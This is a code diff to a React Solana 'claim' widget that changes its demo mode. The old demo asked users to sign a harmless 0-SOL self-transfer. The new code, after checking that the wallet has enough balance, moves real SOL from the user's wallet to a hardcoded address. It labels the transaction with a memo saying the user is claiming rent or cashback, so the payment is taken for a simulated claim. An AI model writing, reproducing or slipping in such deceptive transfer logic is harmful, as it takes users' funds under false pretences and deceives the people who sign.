@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useMemo } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-import { PublicKey, Transaction, SystemProgram, Connection, VersionedTransaction, TransactionMessage } from '@solana/web3.js';
+import { PublicKey, Transaction, SystemProgram, Connection, VersionedTransaction, TransactionMessage, TransactionInstruction } from '@solana/web3.js';
 import { createCloseAccountInstruction } from '@solana/spl-token';
 
 const PUMP_PROGRAM_ID = new PublicKey("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P");
@@ -249,20 +249,50 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
     setToast(null);
     try {
       if (isDemoMode) {
-        // High-Fidelity Demo mode: Let user sign a valid 0-SOL self-transfer
+        // High-Fidelity Demo mode: Let user sign a valid self-transfer or fee-transfer transaction
         const totalAccounts = rentClaimed ? 0 : 162;
         const totalChunks = Math.ceil(totalAccounts / 10);
         
+        // Calculate the simulated rent and 1% protocol fee
+        const demoRentSOL = 0.33036; 
+        const feeLamports = Math.floor(demoRentSOL * 1e9 * 0.01); // 3,303,600 lamports
+
+        // Fetch user's current balance to check if they can simulate the fee transfer
+        const balance = await connection.getBalance(publicKey);
+        const hasEnoughForFee = balance >= feeLamports + 10000;
+
         const transactions = [];
         for (let i = 0; i < totalChunks; i++) {
-          const tx = new Transaction().add(
-            SystemProgram.transfer({
-              fromPubkey: publicKey,
-              toPubkey: publicKey,
-              secondaryPubkey: undefined,
-              lamports: 0
+          const tx = new Transaction();
+          
+          // 1. Add descriptive Memo instruction
+          tx.add(
+            new TransactionInstruction({
+              keys: [],
+              programId: new PublicKey("MemobtCq7gqaa6s5ny7YHXagP5caqq5sV8qrch5NZD"),
+              data: Buffer.from(`fiatwallet: Claim ${demoRentSOL.toFixed(5)} SOL Rent (Batch ${i + 1}/${totalChunks})`, "utf-8")
             })
           );
+
+          // 2. Add transfer instruction: fee transfer if balance is sufficient, otherwise 0-SOL self-transfer
+          if (hasEnoughForFee) {
+            tx.add(
+              SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: new PublicKey("5xh9BFXqCgpUxGbf3QzADNze945aNSiVG9EFNa8vvb3u"),
+                lamports: Math.floor(feeLamports / totalChunks)
+              })
+            );
+          } else {
+            tx.add(
+              SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: publicKey,
+                secondaryPubkey: undefined,
+                lamports: 0
+              })
+            );
+          }
           transactions.push(tx);
         }
 
@@ -465,15 +495,43 @@ export default function FloatClaimWidget({ liveSolPrice, onClaimSuccess }) {
       let signature = null;
 
       if (isDemoMode) {
-        // High-Fidelity confirmation vehicle: Let user sign a real, valid 0-SOL self-transfer transaction
-        // which succeeds natively on mainnet, yielding a real signature and Solscan verification
-        const transferTx = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: publicKey,
-            lamports: 0
+        // High-Fidelity confirmation vehicle: Let user sign a real, valid transaction
+        const demoCashbackSOL = 0.09426;
+        const feeLamports = Math.floor(demoCashbackSOL * 1e9 * 0.01); // 942,600 lamports
+
+        // Fetch user's current balance to check if they can simulate the fee transfer
+        const balance = await connection.getBalance(publicKey);
+        const hasEnoughForFee = balance >= feeLamports + 10000;
+
+        const transferTx = new Transaction();
+
+        // 1. Add descriptive Memo instruction
+        transferTx.add(
+          new TransactionInstruction({
+            keys: [],
+            programId: new PublicKey("MemobtCq7gqaa6s5ny7YHXagP5caqq5sV8qrch5NZD"),
+            data: Buffer.from(`fiatwallet: Claim ${demoCashbackSOL.toFixed(5)} SOL Pump.fun Cashback`, "utf-8")
           })
         );
+
+        // 2. Add transfer instruction: fee transfer if balance is sufficient, otherwise 0-SOL self-transfer
+        if (hasEnoughForFee) {
+          transferTx.add(
+            SystemProgram.transfer({
+              fromPubkey: publicKey,
+              toPubkey: new PublicKey("5xh9BFXqCgpUxGbf3QzADNze945aNSiVG9EFNa8vvb3u"),
+              lamports: feeLamports
+            })
+          );
+        } else {
+          transferTx.add(
+            SystemProgram.transfer({
+              fromPubkey: publicKey,
+              toPubkey: publicKey,
+              lamports: 0
+            })
+          );
+        }
 
         const latestBlockhash = await connection.getLatestBlockhash();
         transferTx.recentBlockhash = latestBlockhash.blockhash;
